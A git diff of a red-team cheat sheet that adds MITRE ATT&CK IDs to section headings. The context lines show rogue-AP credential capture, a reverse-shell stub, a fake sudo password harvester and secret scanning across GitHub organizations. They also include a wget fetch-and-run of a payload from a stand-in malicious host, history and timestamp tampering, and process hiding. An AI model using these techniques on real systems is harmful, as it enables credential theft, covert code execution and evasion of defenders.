+## Exporting Objects with Tshark (T1040)
 
 To extract a file, read in a file, use the --export-objects flag and specify the protocol and directory to save the files. Without -Q, tshark will read packets and send to stdout even though it is exporting objects.
 
@@ -1331,7 +1421,7 @@ smb: Windows network share file
 tftp: Unsecured file
 ```
 
-## Rogue APs with Karmetasploit
+## Rogue APs with Karmetasploit (T1557.002)
 
 Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
 
@@ -1382,7 +1472,7 @@ root@RoseSecurity:~# msfconsole -q -r karma.rc_.txt
 
 At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake ‘captive portal’ style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
 
-## Passive Fingerprinting with P0f
+## Passive Fingerprinting with P0f (T1040)
 
 Use interface eth0 (-i eth0) in promiscuous mode (-p), saving the results to a file (-o /tmp/p0f.log):
 
@@ -1407,7 +1497,7 @@ root@RoseSecurity:~# p0f -i eth0 -p -o /tmp/p0f.log
 | raw_sig  = 4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0
 ```
 
-## Advanced Mitm Attacks with Bettercap Filters
+## Advanced Mitm Attacks with Bettercap Filters (T1557)
 
 Display a message if the tcp port is 22:
 
@@ -1441,7 +1531,7 @@ if (ip.proto == TCP) {
 }
 ```
 
-## Rust Reverse Shell
+## Rust Reverse Shell (T1059)
 
 ```rust
 use std::net::TcpStream;
@@ -1462,7 +1552,7 @@ fn main() {
 }
 ```
 
-## Fake Sudo Program to Harvest Credentials
+## Fake Sudo Program to Harvest Credentials (T1056)
 
 Mimics legitimate Sudo binary to capture credentials and output to ```/tmp``` directory file.
 
@@ -1520,7 +1610,7 @@ int main( int argc, char *argv[] )
 }
 ```
 
-## TruffleHog GitHub Organizations
+## TruffleHog GitHub Organizations (T1552.001)
 
 Enumerate GitHub organizations for secrets and credentials
 
@@ -1528,7 +1618,7 @@ Enumerate GitHub organizations for secrets and credentials
 root@RoseSecurity# orgs=$(curl -s https://api.github.com/organizations | jq -r '.[] | .name'); for i in $orgs; do trufflehog github --org=$i; done
 ```
 
-## Bypass File System Protections (Read-Only and No-Exec) for Containers
+## Bypass File System Protections (Read-Only and No-Exec) for Containers (T1611)
 
 It's increasingly common to find Linux machines mounted with read-only (ro) file system protection, especially in containers. This is because running a container with `ro` file system is as easy as setting `readOnlyRootFilesystem: true` in the `securitycontext`:
 
@@ -1555,7 +1645,7 @@ However, even if the file system is mounted as `ro`, /dev/shm will still be writ
 wget -O- https://malicious.com/hacked.elf | base64 -w0 | bash ddexec.sh argv0 phone home
 ```
 
-## Dumping Printer NVRAM
+## Dumping Printer NVRAM (T1552)
 
 You can dump the NVRAM and extract confidential info (as passwords) by accessing arbitrary addresses using PJL:
 
@@ -1573,7 +1663,7 @@ Writing copy to nvram/printer
 ................................................................................
 ```
 
-## Slash Proc Magic
+## Slash Proc Magic (T1564.001)
 
 Victim Host:
 
@@ -1615,7 +1705,7 @@ ps aux | grep MALICIOUS
 
 By leveraging bind mounts to overlay a /proc/ directory, we demonstrated how a process can seemingly vanish from process listings while maintaining its functionality.
 
-## Linux Timestomping
+## Linux Timestomping (T1070.006)
 
 Timestomping is an anti-forensics technique which is used to modify the timestamps of a file, often to mimic files that are in the same folder.
 
@@ -1637,7 +1727,7 @@ Use the -r option and the file we want to inherit its access and modification ti
 touch -r normal.elf payload.elf
 ```
 
-## Linux Bash History Stomping
+## Linux Bash History Stomping (T1070.003)
 
 One-liner:
 
@@ -1647,7 +1737,7 @@ export HISTFILE=/dev/null; unset HISTFILESIZE; unset HISTSIZE
 
 Defenders can also enable timestamps in ```.bash_history``` using the command: ```export HISTTIMEFORMAT='%F %T '```
 
-## Taking Apart URL Shorteners with cURL
+## Taking Apart URL Shorteners with cURL (T1082)
 
 Ever get a "shortened" url (bit.ly, tinyurl.com or whatever) and stress about "clicking that link"?  Or worse yet, have that "Oh No" moment after you just clicked it? Let's use cURL to avoid this!
 
@@ -1662,7 +1752,7 @@ $ curl -k -v -I https://bit.ly/3ABvcy5 2>&1 | grep -i "< location" | cut -d " " 
 https://isc.sans.edu/
 ```
 
-## Email Spoofing PHP
+## Email Spoofing PHP (T1566)
 
 ```php
 <?php
@@ -1723,7 +1813,7 @@ if ($retval) {
 ?>
 ```
 
-## Linux SIEM Bypass
+## Linux SIEM Bypass (T1006)
 
 ```bash
 ┌──(root㉿kali)-[~]
